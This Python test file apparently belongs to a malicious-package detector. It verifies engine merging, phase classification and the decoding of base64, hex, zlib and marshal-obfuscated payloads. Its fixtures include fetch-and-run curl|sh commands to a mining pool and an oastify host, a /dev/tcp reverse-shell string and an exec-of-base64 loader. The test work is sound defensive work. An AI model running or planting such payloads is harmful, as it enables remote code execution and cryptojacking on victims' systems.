# -*- coding: utf-8 -*-
"""引擎合并 + 单层解码测试（2026-11 API 混淆实测驱动）

钉死的事实（L1-L4 实测）：
  L1 getattr(os,"sys"+"tem")  PyFlow 漏，我们 SSO 抓
  L2/L3/L4 两个引擎都只能抓到 resolver 原语（__import__/getenv）
  合并后 4/4 层都有覆盖
"""
import base64
import sys
import zlib
from pathlib import Path

NEW_DDG = Path(__file__).parent.parent
sys.path.insert(0, str(NEW_DDG))

from src.engine_merge import (merge_capabilities, pick_capability, summarize,
                              phase_of)
from src.literal_decoder import (decode_literal, scan_code, decoded_has_risk)

PASS = FAIL = 0


def check(name, cond, detail=''):
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f"  ✓ {name}")
    else:
        FAIL += 1
        print(f"  ✗ {name}  {detail}")


print("[1] 引擎合并（PyFlow ∪ SSO）")
pkg = Path('/tmp/x')
pkg.mkdir(exist_ok=True)
f_abs = str((pkg / 'a.py').resolve())

pyflow_caps = {'findings': [
    {'capability': 'module.dynamic_import',
     'location': {'file': f_abs, 'line': 2}},          # L2 的 __import__
]}
sso = {'findings': [
    {'file': 'a.py', 'line': 1, 'api': 'os.system',
     'capability': 'process_spawn', 'module_level': True},   # L1 PyFlow 漏的
]}
cap_by_loc, ml = merge_capabilities(pyflow_caps, sso, pkg)

check("合并后有两个位置", len(cap_by_loc) == 2, detail=str(cap_by_loc))
check("L1 位置来自 SSO（PyFlow 盲区被补）",
      cap_by_loc.get((f_abs, 1)) == {'process_spawn'},
      detail=str(cap_by_loc.get((f_abs, 1))))
check("L2 位置来自 PyFlow",
      cap_by_loc.get((f_abs, 2)) == {'code_eval'},
      detail=str(cap_by_loc.get((f_abs, 2))))
check("module_level 由 SSO 提供", ml.get((f_abs, 1)) is True)

# 同一行两个引擎都报 → 取最危险
py2 = {'findings': [{'capability': 'file.write',
                     'location': {'file': f_abs, 'line': 1}}]}
sso2 = {'findings': [{'file': 'a.py', 'line': 1, 'capability': 'process_spawn'}]}
c2, _ = merge_capabilities(py2, sso2, pkg)
check("同行冲突取 Tier 最小（最危险）",
      pick_capability(c2[(f_abs, 1)]) == 'process_spawn',
      detail=str(c2[(f_abs, 1)]))

check("summarize 按行取最危险",
      summarize({(f_abs, 1): {'file_write', 'process_spawn'}}) ==
      {'process_spawn': 1})

print("[2] 执行时机（module_level 优先于文件名）")
check("setup.py 顶层 → install",
      phase_of(True, '/x/setup.py', '<module>') == 'install')
check("__init__.py 顶层 → import",
      phase_of(True, '/x/pkg/__init__.py', '<module>') == 'import')
check("setup.py 函数内 → runtime",
      phase_of(False, '/x/setup.py', 'run') == 'runtime')
check("module_level 缺失时回落文件名",
      phase_of(None, '/x/setup.py', None) == 'install')

print("[3] 单层解码")
b64 = base64.b64encode(b'subprocess.Popen("/dev/tcp/1.2.3.4/4444")').decode()
hits = decode_literal(b64)
check("base64 解码成功", any(h['method'].startswith('base64') for h in hits),
      detail=str(hits[:1]))
check("解出内容命中敌意特征",
      any(decoded_has_risk(h['decoded']) for h in hits))
check("解出内容保留原文",
      any('/dev/tcp/1.2.3.4' in h['decoded'] for h in hits))

hexs = b'os.system("curl http://pool.supportxmr.com/x.sh|sh")'.hex()
h2 = decode_literal(hexs)
check("hex 解码", any(h['method'].startswith('hex') for h in h2), detail=str(h2[:1]))

# 嵌套：zlib 压缩后再 base64
inner = b"stratum+tcp://pool.supportxmr.com:3333"
zl = base64.b64encode(zlib.compress(inner)).decode()
h3 = decode_literal(zl)
check("base64+zlib 可解", any('stratum' in h['decoded'] for h in h3),
      detail=str(h3[:2]))

# 反例
check("短串不解", decode_literal("abc") == [])
check("普通文本不解出东西",
      all('http' not in h['decoded'] for h in decode_literal("hello world this is a normal sentence")))

print("[4] scan_code 从源码提取")
code = f'payload = "{b64}"\nexec(payload)\n'
found = scan_code(code)
check("从代码里找到隐藏载荷", len(found) >= 1, detail=str(len(found)))
check("标记来源位置字段", found and 'literal' in found[0])
check("解出危险内容", any(f.get('decoded') and decoded_has_risk(f['decoded'])
                          for f in found) if found else False)

print("[5] 敌意字面量门看解码内容")
from src.graph_digest import any_hostile_literal
NODES = [{'node_id': 'n1', 'code': f'exec(base64.b64decode("{b64}"))',
          'file': '/x/a.py', 'line': 1}]
check("编码载荷的链通过敌意字面量门",
      any_hostile_literal([{'nodes': ['n1']}], NODES) is True)
NODES2 = [{'node_id': 'n2', 'code': 'x = compute(3)', 'file': '/x/a.py', 'line': 2}]
check("普通代码不通过",
      any_hostile_literal([{'nodes': ['n2']}], NODES2) is False)

print("[6] 超级混淆（marshal 字节码 / 多层嵌套）")
import marshal as _m
_src = 'import os' + chr(10) + 'os.system("curl http://x.oastify.com/p | sh")' + chr(10)
_mb64 = base64.b64encode(_m.dumps(compile(_src, '<p>', 'exec'))).decode()
_h = decode_literal(_mb64)
check("marshal 字节码被静态解析（不执行）",
      any(h['method'].startswith('marshal') for h in _h),
      detail=str([x['method'] for x in _h]))
check("marshal 载荷字符串被取出",
      any('oastify' in h['decoded'] for h in _h), detail=str(_h[:2]))
check("marshal 里的 API 名被取出",
      any('system' in h['decoded'] for h in _h))
# 三层嵌套
_l = b'os.system("curl http://pool.supportxmr.com/x")'
for _ in range(3):
    _l = base64.b64encode(zlib.compress(_l))
_h3 = decode_literal(_l.decode())
check("三层嵌套全部剥开",
      any('supportxmr' in h['decoded'] for h in _h3),
      detail=str([(x['method'], x['decoded'][:20]) for x in _h3]))
# 良性对照：二进制不得产生伪文本
_img = base64.b64encode(bytes(range(256)) * 4).decode()
check("良性二进制不产生伪解出", decode_literal(_img) == [],
      detail=str(decode_literal(_img)[:1]))
_okjson = base64.b64encode(b'{"name":"requests","version":"2.31"}').decode()
check("良性 JSON 正常解出", len(decode_literal(_okjson)) >= 1)

print()
print(f"引擎合并+解码: PASS={PASS} FAIL={FAIL}")
sys.exit(1 if FAIL else 0)
